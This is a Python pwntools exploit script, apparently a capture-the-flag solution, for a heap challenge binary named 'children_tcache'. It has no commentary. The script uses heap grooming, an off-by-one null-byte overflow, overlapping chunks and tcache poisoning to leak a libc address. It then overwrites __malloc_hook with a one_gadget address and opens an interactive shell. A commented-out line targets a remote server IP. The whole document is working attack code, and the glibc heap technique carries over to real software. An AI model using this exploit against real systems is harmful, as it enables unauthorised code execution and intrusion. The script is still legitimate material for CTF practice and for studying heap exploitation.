from pwn import *
#p=process('./child',env={'LD_PRELOAD':'./libc.so.6'})
#p=remote('54.178.132.125', 8763)
p = process("./children_tcache")
libc = ELF('./children_tcache_libc.so.6')
def add(size,data):
    p.recvuntil('choice')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(data)

def dele(index):
    p.recvuntil('choice')
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline(str(index))

for i in range(7):
    add(0x80,'xxx\n')
for i in range(7):
    dele(i)

for i in range(7):
    add(0x110-8,'xxx\n')

add(0x110-8,'aaaa\n')#7
add(0x100,'bbbb\n')#8
add(0x100,'cccc\n')#9

for i in range(7):
    dele(i)

dele(8)
dele(7)

#raw_input()
for i in range(7):
    add(0x110-8,'aaaa\n') #0-6
add(0x110-8,'a'*(0x110-8))#7
for i in range(7):
    dele(i)
#raw_input()
for i in range(7):
    add(0x80,'1234567\n')#0-6

add(0x80,'xxxxxxxx\n')#8

for i in range(7):
    dele(i)

add(0x60,'ABCD\n')#0

dele(8)
dele(9)
add(0x40,'a\n')#1
add(0x30,'b\n')#2
add(0x500,'aaaa\n')#3
add(0x120,'bbbb\n')#4
#0,3->same chunk
dele(3)
p.recvuntil('choice')
p.sendline('2')
p.recvuntil("Index:")
p.sendline('0')
addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = addr - (0x00007f2e9c12dca0-0x7f2e9bd42000)
info("libc:0x%x",libc_base)
malloc_hook = libc_base+libc.symbols['__malloc_hook']
info("malloc hook:0x%x",malloc_hook)
one = libc_base + 0x10a38c
add(0x500,'aaaaa\n')#3
dele(3)
add(0x120,'ABCDABCD\n')
dele(4)
dele(3)
dele(0)
add(0x120,p64(malloc_hook)+'\n')

add(0x120,p64(one)+'\n')
add(0x120,p64(one)+'\n')

p.sendline('1')
p.sendline('304')
p.interactive()

